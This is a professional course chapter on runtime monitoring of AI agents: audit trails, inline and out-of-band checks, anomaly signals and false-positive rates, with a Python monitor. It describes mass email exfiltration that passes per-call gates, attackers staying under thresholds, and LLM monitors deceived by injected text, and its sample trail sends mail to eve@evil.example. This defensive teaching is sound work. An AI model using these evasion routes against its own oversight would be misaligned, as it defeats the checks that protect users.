# 05. Runtime Monitoring and Detection

**Level:** Professional · **Reading time:** 20 min · **Exercise:** 60 min
**Prerequisites:** [Defenses: Guardrails, Detection and Secure Design](04-defenses-guardrails-detection-and-secure-design.md)

> **In one sentence:** After this chapter you can place runtime monitoring in an agent's architecture, decide for each check whether it sits on the path or beside it, and state its cost, latency, and false-positive trade-offs in numbers.

## Why this matters

You built the policy gate from the previous chapter. The user asks the agent to forward today's email to a colleague. The agent forwards 40,000 messages, one call at a time, all to a known address. Every single call was allowed by the policy for "forward email". The gate saw nothing wrong.

A gate judges one action at a time. Some attacks are only visible in the shape of many actions. The question of this chapter: what should watch a running agent, and what is watching worth?

## The core idea

**Runtime protection** is any check that happens while the agent runs. Dawn Song lists five kinds: input guards, output guards, information flow control and taint tracking, monitoring, and a human in the loop ([84:00](https://www.youtube.com/watch?v=CvZDJxd4LKM&t=5040), Fall 2025).

Three definitions sort them.

- A **monitor** observes the events of a running system and raises findings.
- A **detector** is the rule or model that decides whether an observation is a problem.
- An **audit trail** is the record of events that lets you reconstruct a run afterwards.

The main design choice is where a check sits. The framing in this section and the next two is engineering judgment, not lecture content.

- **Inline**: on the path between the model and its effect. It can block. It adds its own latency to every step. Input guards and policy enforcement are inline.
- **Out of band**: beside the path. It sees everything and blocks nothing in time. It costs almost no latency. Anomaly detection over an audit trail is out of band.
- **Human**: the slowest and most expensive inline check. Reserve it for actions that cannot be undone.

The analogy is a building. The turnstile at the door is inline. The cameras are out of band. The person who reviews the footage is the human check. The analogy breaks in one place. A camera cannot be lied to by what it films. A detector built on a language model reads the same untrusted text as the agent, so it can be deceived by the same text.

## How it works, step by step

### 1. Define the event

Everything else depends on the audit trail. One record per event, with at least:

- a run identifier, a step number, and a timestamp,
- the model version,
- the input's **provenance**: which piece of text came from the user, from a tool, or from outside,
- the output, and each tool call with its arguments,
- the policy decision and its reason,
- latency and token counts.

Provenance is the part teams skip. The model does not receive it. Your log is the only place where it survives, and it is what turns an incident into a diagnosis.

### 2. Keep the hard checks inline

An **input guard** runs before the model. **Policy enforcement** runs before each tool call. Song describes Progent's enforcement component as a component that monitors the agent's actions from its outputs and enforces the policies on them ([88:00](https://www.youtube.com/watch?v=CvZDJxd4LKM&t=5280)). In Spring 2025 she described the loop: the enforcement point observes each tool call, allows it, or blocks it and gives a reason ([96:00](https://www.youtube.com/watch?v=ti6yPE2VPZc&t=5760)). Each decision, with its reason, lands in the audit trail.

### 3. Track untrusted data

**Information flow control**, or **taint tracking**, labels data that came from an untrusted source and follows it through the system. Song names two problems: over-tainting, when too much is labeled, and runtime overhead ([92:00](https://www.youtube.com/watch?v=CvZDJxd4LKM&t=5520)).

### 4. Run anomaly detection out of band

**Anomaly detection** flags behavior that differs from the normal pattern. A runtime monitor can watch the agent's behavior and the execution of the whole system, to find anomalies and unsafe actions ([92:00](https://www.youtube.com/watch?v=CvZDJxd4LKM&t=5520)). Four families of signal:

| Signal | Example |
|--------|---------|
| Counts | Tool calls, steps, or tokens in one run |
| Rates | Calls per minute to one tool |
| Shapes | An argument that does not fit the task, such as a new recipient domain |
| Sequences | A read-then-export pattern, or a goal that differs from the first request |

### 5. Send findings to a person

A human in the loop validates critical and high-impact actions ([94:00](https://www.youtube.com/watch?v=CvZDJxd4LKM&t=5640)). A finding from an out-of-band monitor usually arrives too late to block. Its value is in stopping the run, alerting a person, and adding a case to the test suite.

### 6. Feed the findings back

Every confirmed finding becomes a rule, a policy, or a test. The test belongs in the regression suite of [Red-Teaming and Safety Evaluation](06-red-teaming-and-safety-evaluation.md).

### What a monitor can and cannot see

This table is engineering judgment, not lecture content.

| A monitor can see | A monitor cannot see |
|-------------------|----------------------|
| Every tool call with its arguments | What the model intended |
| Which text from which source preceded an action, if provenance is logged | Whether a correct-looking action came from an injection or from a bad request |
| Counts, rates, and costs | An attack that stays under every threshold |
| Every policy decision | Anything inside a hosted model |
| What your own code does | Channels you do not log |

### Cost, latency, and false positives

These trade-offs are also engineering judgment.

- **Cost.** A check on structured events is nearly free. A guard built on a language model is one more model call per step, so it roughly doubles the number of calls. Its token cost is the monitor's tokens per step divided by the task's tokens per step.
- **Latency.** A rule adds microseconds. A model-based guard adds a delay comparable to the step it checks, and it adds it to every step.
- **False positives.** A blocked benign step costs a user's time and trust. An alert that turns out to be harmless costs a reviewer's attention, and enough of them teach people to ignore the monitor.
- **False negatives.** A detector tuned on yesterday's attacks misses today's.

Long runs make false positives worse than they look. With a per-step false-positive rate p, a run of n steps raises at least one false alert with a probability of 1 − (1 − p)ⁿ. At p = 0.1%, a run of 200 steps has an 18% chance of a false alert. At p = 1%, it has an 87% chance. A rate that sounds small becomes a noisy monitor on a long task. So block automatically only for actions that are both rare and impossible to undo, and flag everything else.

### A second model as a monitor

The lectures do not present a monitoring agent. This paragraph is this repository's own suggestion. Where a rule cannot express the constraint, a second language model can read the user's request and the proposed action and judge whether the action serves the request. Keep it inline, keep its output to allow, block, or escalate, and give it structured events rather than raw pages. Evaluate it as you would any judge (see [LLM as a Judge and Rubrics](../03-evaluation/03-llm-as-a-judge-and-rubrics.md)), and never as the only control. The capstone of this course builds a monitoring agent for prompt injection: [capstone](../11-professional-practice/03-capstone-monitoring-agent-for-prompt-injection.md).

## Worked example

An out-of-band monitor over an audit trail, in plain Python and without a model.

```python
# monitor_demo.py: checks over one run's audit trail, in audit.jsonl.
import json

LIMITS = {"tool_calls": 12, "reads_per_send": 50}
KNOWN_DOMAINS = {"example.com"}


def findings(path: str) -> list:
    calls = reads = sends = 0
    odd = []
    with open(path) as trail:
        for line in trail:                      # one JSON object per event
            event = json.loads(line)
            if event["type"] != "tool_call":
                continue
            calls += 1
            reads += event["tool"] == "read_email"
            sends += event["tool"] == "send_email"
            if event["tool"] == "send_email":
                domain = event["args"]["to"].split("@")[-1]
                if domain not in KNOWN_DOMAINS:
                    odd.append(f"send to a new recipient domain: {event['args']['to']}")
    out = []
    if calls > LIMITS["tool_calls"]:
        out.append(f"{calls} tool calls (limit {LIMITS['tool_calls']})")
    if sends and reads / sends > LIMITS["reads_per_send"]:
        out.append(f"{reads} reads for {sends} sends: possible mass export")
    return out + odd


if __name__ == "__main__":
    print("\n".join(findings("audit.jsonl")) or "no findings")
```

A small trail of the same kind, with the reads shortened to one line:

```text
{"type": "tool_call", "tool": "read_email", "args": {}}
{"type": "tool_call", "tool": "send_email", "args": {"to": "eve@evil.example"}}
```

What to observe:

- Each call in that trail has a valid shape, so a gate that checks permissions per call may pass both. The monitor adds what the gate lacks: the number of reads against sends, and the list of known recipient domains.
- Each rule has a false-positive story. A user who asks "read this week's mail and send me one summary" has many reads for one send and trips the ratio rule. That is why the monitor flags and does not block.
- The findings have no run identifier or provenance in this short version. A real trail adds the fields of step 1.

## What the practitioners say

Dawn Song treats monitoring as one mechanism among several, in both lectures.

- **Spring 2025: a mechanism with open questions.** She lists eight defense mechanism families, monitoring and detection among them, and says they work best in conjunction as layers ([106:00](https://www.youtube.com/watch?v=ti6yPE2VPZc&t=6360)). Monitoring, in her description, observes system behavior including outputs and applies anomaly detection. Her open questions: how to audit systems that read and write enormous amounts of text, how to "balance full auditability and storage costs" (her slide), and how to make anomaly detection work in many different settings ([106:00](https://www.youtube.com/watch?v=ti6yPE2VPZc&t=6360)). She closes with information flow tracking across tool boundaries, and with the difficulty of writing formal specifications for a model ([108:00](https://www.youtube.com/watch?v=ti6yPE2VPZc&t=6480)).
- **Fall 2025: part of runtime protection.** She groups monitoring with input guards, output guards, and the human in the loop as runtime protections ([84:00](https://www.youtube.com/watch?v=CvZDJxd4LKM&t=5040)). A runtime monitoring system, she says, watches the agent's behavior and the execution of the whole system, for anomaly detection and for unsafe actions ([92:00](https://www.youtube.com/watch?v=CvZDJxd4LKM&t=5520)).

Neither lecture describes a monitor built on a second agent, and the slides of the Fall 2025 lecture are not publicly available. The positions, the signals, and the trade-offs in this chapter are the authors' own, built on the mechanisms she names. <!-- SOURCE GAP: the f25-12 packet contains no slides and no description of a monitoring agent. -->

## Pitfalls

- **Logging answers, not actions.** The expensive failure is a tool call. Log every call with its arguments.
- **Dropping provenance.** Without a record of which text from which source came before an action, you cannot tell an injection from a bad request.
- **Blocking on every anomaly.** Long runs make small false-positive rates certain. Block only the rare and irreversible.
- **Setting thresholds once.** An adaptive attacker stays under a fixed threshold. Revisit thresholds after every red-team run.
- **Storing full prompts forever.** Full auditability has a storage cost and a privacy cost. Decide what to keep and for how long.
- **A model-based monitor that reads raw pages.** It can be injected like the agent. Feed it structured events.
- **No run identifier.** Without one, a run cannot be reconstructed across its steps.

## Try it

Add an audit trail and an out-of-band monitor to an agent you control.

1. Emit one event per step with the fields of step 1.
2. Write three rules: one on counts, one on shapes, one on sequences.
3. Run twenty benign tasks and your injection suite through the agent.
4. Measure storage per run, false alerts per 1,000 steps on the benign tasks, and attacks caught in the suite.

You are done when you have those three numbers in writing, each rule has a documented false-positive story, and every finding names the run and the step. Stretch goal: add an inline goal-consistency check with a second model, and measure the latency it adds per step and its false-positive rate.

## Key takeaways

- Runtime protection has five parts in Song's list: input guards, output guards, information flow tracking, monitoring, and a human in the loop.
- Inline checks block and cost latency. Out-of-band checks cost little and block nothing in time. A human is the costliest inline check.
- Provenance survives only in your log. It is what makes an incident diagnosable.
- On long runs, small false-positive rates become certain false alerts. Block only what is rare and irreversible.
- Monitoring is one layer. Its findings are worth nothing until they become a policy, a rule, or a test.

## Self-check

1. A check can block an action but adds latency to every step. Which position is it in, and which two mechanisms from the lecture sit there?
2. Why does the audit trail need provenance when the model does not receive it?
3. A rule has a 0.1% false-positive rate per step. What is the chance of at least one false alert in a 200-step run, and what follows for blocking policy?
4. Why does a detector built on a language model need more care than a rule on counts?
5. What happens to a confirmed finding so that the same attack stops working?

<details><summary>Show answers</summary>

1. Inline. Input guards and policy enforcement on tool calls.
2. Because the model cannot see where text came from. The log is the only place that records it, and it distinguishes an injection from a bad request.
3. About 18% (1 − 0.999²⁰⁰). Block automatically only for rare and irreversible actions, and flag the rest.
4. It reads the same untrusted text as the agent, so it can be deceived by the same text, and it is a probabilistic judge rather than a fixed rule.
5. It becomes a policy, a rule, or a test in the regression suite.

</details>

## Sources

- **Lecture:** Dawn Song, "Agentic AI Safety & Security", UC Berkeley Agentic AI MOOC (Fall 2025): [video](https://www.youtube.com/watch?v=CvZDJxd4LKM), used at [runtime protections](https://www.youtube.com/watch?v=CvZDJxd4LKM&t=5040), [policy enforcement on actions](https://www.youtube.com/watch?v=CvZDJxd4LKM&t=5280), [runtime monitoring and taint tracking](https://www.youtube.com/watch?v=CvZDJxd4LKM&t=5520), [human in the loop](https://www.youtube.com/watch?v=CvZDJxd4LKM&t=5640)
- **Lecture:** Dawn Song, "Towards building safe and secure agentic AI", UC Berkeley Advanced LLM Agents MOOC (Spring 2025): [video](https://www.youtube.com/watch?v=ti6yPE2VPZc), used at [the enforcement loop](https://www.youtube.com/watch?v=ti6yPE2VPZc&t=5760), [monitoring as one layer and its open questions](https://www.youtube.com/watch?v=ti6yPE2VPZc&t=6360), [information flow tracking](https://www.youtube.com/watch?v=ti6yPE2VPZc&t=6480)

## Next

→ [Red-Teaming and Safety Evaluation](06-red-teaming-and-safety-evaluation.md), for how to measure whether all these layers hold.
